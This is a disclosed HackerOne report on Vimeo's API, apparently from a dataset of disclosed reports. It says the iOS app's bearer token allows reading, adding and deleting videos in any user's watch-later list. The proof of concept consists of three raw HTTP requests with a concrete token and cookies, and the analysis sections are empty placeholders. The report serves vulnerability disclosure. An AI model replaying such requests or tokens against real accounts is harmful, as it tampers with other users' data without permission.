---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '52982'
original_report_id: '52982'
title: '[URGENT ISSUE] Add or Delete the videos in watch later list of any user .'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: vimeo
created_at: '2015-03-22T12:07:22.727Z'
disclosed_at: '2015-05-01T15:46:57.935Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# [URGENT ISSUE] Add or Delete the videos in watch later list of any user .

## Metadata

- HackerOne Report ID: 52982
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: vimeo
- Disclosed At: 2015-05-01T15:46:57.935Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

This could be done using vimeo api .I used the access token of IOS vimeo app .An attacker could remotely add and delete the videos in watchlater list of any user with out any permission of user.

get the watch later list:
GET /users/<any_user_id>/watchlater/ HTTP/1.1
Host: api.vimeo.com
Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
Accept-Encoding: gzip, deflate
Accept: application/vnd.vimeo.*+json; version=3.3
Cookie: __utma=18302654.1532978367.1426999777.1426999777.1426999777.1; __utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
Accept-Language: en;q=1, hi;q=0.9
Connection: keep-alive
Proxy-Connection: keep-alive
User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)

post any video to watchlater list:

PUT /users/<any_user_id>/watchlater/<any_video_id> HTTP/1.1
Host: api.vimeo.com
Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
Accept-Encoding: gzip, deflate
Accept: application/vnd.vimeo.*+json; version=3.3
Cookie: __utma=18302654.1532978367.1426999777.1426999777.1426999777.1; __utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
Accept-Language: en;q=1, hi;q=0.9
Connection: keep-alive
Proxy-Connection: keep-alive
User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)

delete videos from watchlater list
DELETE /users/<any_user_id>/watchlater/<any_video_id> HTTP/1.1
Host: api.vimeo.com
Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
Accept-Encoding: gzip, deflate
Accept: application/vnd.vimeo.*+json; version=3.3
Cookie: __utma=18302654.1532978367.1426999777.1426999777.1426999777.1; __utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
Accept-Language: en;q=1, hi;q=0.9
Connection: keep-alive
Proxy-Connection: keep-alive
User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)

above dump can be used for proof of concept .fix this issue asap.

I will message the proof of concept as a video

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
